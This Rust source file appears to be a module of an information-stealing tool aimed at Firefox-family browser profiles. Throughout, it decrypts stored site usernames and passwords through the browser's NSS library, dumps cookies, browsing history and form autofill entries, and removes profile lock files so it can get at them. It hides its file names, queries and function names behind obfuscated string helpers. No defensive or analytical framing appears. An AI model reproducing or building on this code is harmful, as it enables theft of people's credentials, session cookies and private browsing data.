use std::{env, ffi, fs, path::{Path, PathBuf}};
use rusqlite::Connection;
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use crate::encrypted::*;

#[repr(C)]
pub struct SECItem {
    item_type: u32,
    data: *mut u8,
    len: u32,
}

pub fn decrypt_nss_value(nss_lib: &libloading::Library, encrypted_b64: &str) -> Option<String> {
    if encrypted_b64.is_empty() {
        return Some(String::new());
    }
    let encrypted = general_purpose::STANDARD.decode(encrypted_b64).ok()?;

    unsafe {
        let pk11sdr_decrypt: libloading::Symbol<
            unsafe extern "C" fn(*mut SECItem, *mut SECItem, *mut ffi::c_void) -> i32,
        > = nss_lib.get(s_gck_pk11sdr_decrypt().as_bytes()).ok()?;

        let mut input = SECItem {
            item_type: 0,
            data: encrypted.as_ptr() as *mut u8,
            len: encrypted.len() as u32,
        };

        let mut output = SECItem {
            item_type: 0,
            data: std::ptr::null_mut(),
            len: 0,
        };

        let status = pk11sdr_decrypt(&mut input, &mut output, std::ptr::null_mut());

        if status == 0 && !output.data.is_null() && output.len > 0 {
            let result =
                std::slice::from_raw_parts(output.data, output.len as usize).to_vec();

            if let Ok(free_fn) =
                nss_lib.get::<unsafe extern "C" fn(*mut SECItem, i32)>(s_gck_secitem_zfree().as_bytes())
            {
                free_fn(&mut output, 0);
            }

            Some(String::from_utf8_lossy(&result).into_owned())
        } else {
            None
        }
    }
}

pub fn extract_passwords_nss(profile_path: &Path, nss_dir: &Path) -> Option<String> {
    let logins_json_path = profile_path.join(s_gck_logins_json());
    let key4_db_path = profile_path.join(s_gck_key4_db());
    let key3_db_path = profile_path.join(s_gck_key3_db());

    if !logins_json_path.exists() && !key4_db_path.exists() && !key3_db_path.exists() {
        return None;
    }

    let parent_lock = profile_path.join(s_gck_parent_lock_file());
    if parent_lock.exists() {
        let _ = fs::remove_file(&parent_lock);
    }
    if let Some(parent) = profile_path.parent() {
        let parent_lock2 = parent.join(s_gck_parent_lock_file());
        if parent_lock2.exists() {
            let _ = fs::remove_file(&parent_lock2);
        }
    }

    let original_path = env::var(s_env_path()).unwrap_or_default();
    unsafe {
        env::set_var(s_env_path(), format!("{};{}", nss_dir.display(), original_path));
    }

    let result = (|| -> Option<String> {
        let nss_lib =
            unsafe { libloading::Library::new(nss_dir.join(s_gck_nss3_dll())).ok()? };

        unsafe {
            let profile_cstr =
                ffi::CString::new(profile_path.to_string_lossy().as_bytes()).ok()?;

            let mut status = if let Ok(nss_init) = nss_lib
                .get::<unsafe extern "C" fn(*const ffi::c_char) -> i32>(s_gck_nss_init().as_bytes())
            {
                nss_init(profile_cstr.as_ptr())
            } else {
                -1
            };

            if status != 0 {
                if let Ok(nss_init_ro) = nss_lib
                    .get::<unsafe extern "C" fn(*const ffi::c_char) -> i32>(s_gck_nss_init_readonly().as_bytes())
                {
                    status = nss_init_ro(profile_cstr.as_ptr());
                }
            }

            if status != 0 {
                return None;
            }
        }

        let mut output = String::new();

        if logins_json_path.exists() {
            if let Some(data) = extract_from_json(&nss_lib, &logins_json_path) {
                output.push_str(&data);
            }
        }

        if key4_db_path.exists() || key3_db_path.exists() {
            let db_src = if key4_db_path.exists() { &key4_db_path } else { &key3_db_path };
            if let Some(temp_db) = copy_db(db_src) {
                if let Ok(conn) = Connection::open(&temp_db) {
                    if let Some(data) = extract_logins_from_sqlite(&nss_lib, &conn) {
                        output.push_str(&data);
                    }
                }
                let _ = fs::remove_file(&temp_db);
            }
        }

        unsafe {
            if let Ok(nss_shutdown) =
                nss_lib.get::<unsafe extern "C" fn() -> i32>(s_gck_nss_shutdown().as_bytes())
            {
                let _ = nss_shutdown();
            }
        }

        if output.is_empty() { None } else { Some(output) }
    })();

    unsafe {
        env::set_var(s_env_path(), original_path);
    }
    result
}

fn extract_from_json(nss_lib: &libloading::Library, logins_path: &Path) -> Option<String> {
    let content = fs::read_to_string(logins_path).ok()?;
    let json: Value = serde_json::from_str(&content).ok()?;
    let logins = json[s_gck_logins_array()].as_array()?;

    let mut output = String::new();
    for login in logins {
        let hostname = login[s_gck_hostname_field()].as_str().unwrap_or("N/A");
        let enc_username = login[s_gck_enc_username()].as_str().unwrap_or("");
        let enc_password = login[s_gck_enc_password()].as_str().unwrap_or("");

        let username = decrypt_nss_value(nss_lib, enc_username)
            .unwrap_or_else(|| "[decryption failed]".to_string());
        let password = decrypt_nss_value(nss_lib, enc_password)
            .unwrap_or_else(|| "[decryption failed]".to_string());

        {
            let fmt = s_cred_fmt();
            let entry = fmt
                .replacen("{}", hostname, 1)
                .replacen("{}", &username, 1)
                .replacen("{}", &password, 1)
                .replacen("{}", &"-".repeat(50), 1);
            output.push_str(&entry);
        }
    }

    if output.is_empty() { None } else { Some(output) }
}

fn extract_logins_from_sqlite(nss_lib: &libloading::Library, conn: &Connection) -> Option<String> {
    let query = s_gck_query_logins_sqlite();
    let mut stmt = conn.prepare(&query).ok()?;

    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let hostname: String = row.get(0)?;
        let enc_username: Vec<u8> = row.get(1)?;
        let enc_password: Vec<u8> = row.get(2)?;
        Ok((hostname, enc_username, enc_password))
    }).ok()?;

    for row in rows.flatten() {
        let (hostname, enc_username, enc_password) = row;

        let username = if !enc_username.is_empty() {
            let b64 = general_purpose::STANDARD.encode(&enc_username);
            decrypt_nss_value(nss_lib, &b64)
                .unwrap_or_else(|| "[decryption failed]".to_string())
        } else {
            String::new()
        };

        let password = if !enc_password.is_empty() {
            let b64 = general_purpose::STANDARD.encode(&enc_password);
            decrypt_nss_value(nss_lib, &b64)
                .unwrap_or_else(|| "[decryption failed]".to_string())
        } else {
            String::new()
        };

        {
            let fmt = s_cred_fmt();
            let entry = fmt
                .replacen("{}", &hostname, 1)
                .replacen("{}", &username, 1)
                .replacen("{}", &password, 1)
                .replacen("{}", &"-".repeat(50), 1);
            output.push_str(&entry);
        }
    }

    if output.is_empty() { None } else { Some(output) }
}

pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() {
        return None;
    }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("gk_db_{}.sqlite", nanos));

    let mut last_err = None;
    for attempt in 0..3 {
        match fs::copy(db_path, &temp) {
            Ok(_) => {
                last_err = None;
                break;
            }
            Err(e) => {
                last_err = Some(e);
                if attempt < 2 {
                    std::thread::sleep(std::time::Duration::from_millis(200 * (attempt + 1) as u64));
                }
            }
        }
    }
    if last_err.is_some() {
        return None;
    }

    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in [s_db_wal(), s_db_shm(), s_db_journal()] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            let _ = fs::copy(&src, &dst);
        }
    }
    Some(temp)
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", &s_db_wal(), &s_db_shm(), &s_db_journal()] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

pub fn open_db_robust(db_path: &Path) -> Option<(Connection, PathBuf)> {
    for attempt in 0..3 {
        if let Some(temp) = copy_db(db_path) {
            if let Ok(conn) = Connection::open(&temp) {
                return Some((conn, temp));
            }
            cleanup_db(&temp);
        }
        if attempt < 2 {
            std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
        }
    }
    None
}

pub fn extract_cookies(profile_path: &Path) -> Option<String> {
    let (conn, temp) = open_db_robust(&profile_path.join(s_gck_cookies_sqlite()))?;
    let mut stmt = conn.prepare(&s_gck_query_moz_cookies()).ok()?;

    let mut body = String::new();
    let mut count = 0;
    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let value: String = row.get(2)?;
        let path: String = row.get(3)?;
        let expiry: i64 = row.get(4)?;
        let is_secure: i32 = row.get(5)?;
        let is_httponly: i32 = row.get(6)?;
        Ok((host, name, value, path, expiry, is_secure, is_httponly))
    }).ok()?;

    for row in rows.flatten() {
        let (host, name, value, path, expiry, is_secure, is_httponly) = row;
        if name.is_empty() { continue; }
        body.push_str(&crate::browsers::common::nts::format_line(
            &host, &path, is_secure != 0, expiry, &name, &value, is_httponly != 0,
        ));
        count += 1;
    }

    drop(stmt); drop(conn); cleanup_db(&temp);
    if count == 0 { None } else { crate::browsers::common::nts::build_file(&body) }
}

pub fn extract_history(profile_path: &Path) -> Option<String> {
    let (conn, temp) = open_db_robust(&profile_path.join(s_gck_places_sqlite()))?;
    let mut stmt = conn.prepare(&s_gck_query_places()).ok()?;

    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: Option<String> = row.get(1)?;
        let visit_count: i64 = row.get(2)?;
        let last_visit: Option<i64> = row.get(3)?;
        Ok((url, title, visit_count, last_visit))
    }).ok()?;

    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!(
            "URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url, title.unwrap_or_default(), visit_count, last_visit.unwrap_or(0),
            "-".repeat(50)
        ));
    }

    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_autofill(profile_path: &Path) -> Option<String> {
    let (conn, temp) = open_db_robust(&profile_path.join(s_gck_formhistory_sqlite()))?;
    let mut stmt = conn.prepare(&s_gck_query_formhistory()).ok()?;

    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        Ok((name, value, count))
    }).ok()?;

    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!(
            "Field: {}\nValue: {}\nUsed: {}\n{}\n",
            name, value, count, "-".repeat(50)
        ));
    }

    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

pub fn display_profile_name(ini_name: &str) -> String {
    if ini_name.eq_ignore_ascii_case("default") {
        s_gck_profile_default()
    } else {
        ini_name.to_string()
    }
}

fn push_ini_profile(profiles: &mut Vec<(String, PathBuf)>, profiles_dir: &Path, name: &str, path: &str) {
    let profile_path = if Path::new(path).is_absolute() {
        PathBuf::from(path)
    } else {
        profiles_dir.join(path)
    };
    if profile_path.is_dir() {
        profiles.push((display_profile_name(name), profile_path));
    }
}

pub fn parse_profiles_ini(ini: &Path, profiles_dir: &Path) -> Vec<(String, PathBuf)> {
    let content = match fs::read_to_string(ini) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    let mut current_name: Option<String> = None;
    let mut current_path: Option<String> = None;

    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('[') && line.contains(']') {
            if let (Some(name), Some(path)) = (current_name.take(), current_path.take()) {
                push_ini_profile(&mut profiles, profiles_dir, &name, &path);
            }
            continue;
        }
        if let Some((key, value)) = line.split_once('=') {
            let k = key.trim();
            if k == s_gck_ini_key_name() {
                current_name = Some(value.trim().to_string());
            } else if k == s_gck_ini_key_path() {
                current_path = Some(value.trim().to_string());
            }
        }
    }
    if let (Some(name), Some(path)) = (current_name, current_path) {
        push_ini_profile(&mut profiles, profiles_dir, &name, &path);
    }
    profiles
}

pub fn get_profiles(profiles_dir: &Path) -> Vec<(String, PathBuf)> {
    let ini_in_dir = profiles_dir.join(s_gck_profiles_ini());
    if ini_in_dir.exists() {
        let parsed = parse_profiles_ini(&ini_in_dir, profiles_dir);
        if !parsed.is_empty() { return parsed; }
    }

    if let Some(parent) = profiles_dir.parent() {
        let ini = parent.join(s_gck_profiles_ini());
        if ini.exists() {
            let parsed = parse_profiles_ini(&ini, profiles_dir);
            if !parsed.is_empty() { return parsed; }
        }
    }

    let mut profiles = Vec::new();
    if let Ok(entries) = fs::read_dir(profiles_dir) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                let name = entry.file_name().to_string_lossy().to_string();
                profiles.push((name, entry.path()));
            }
        }
    }
    profiles
}
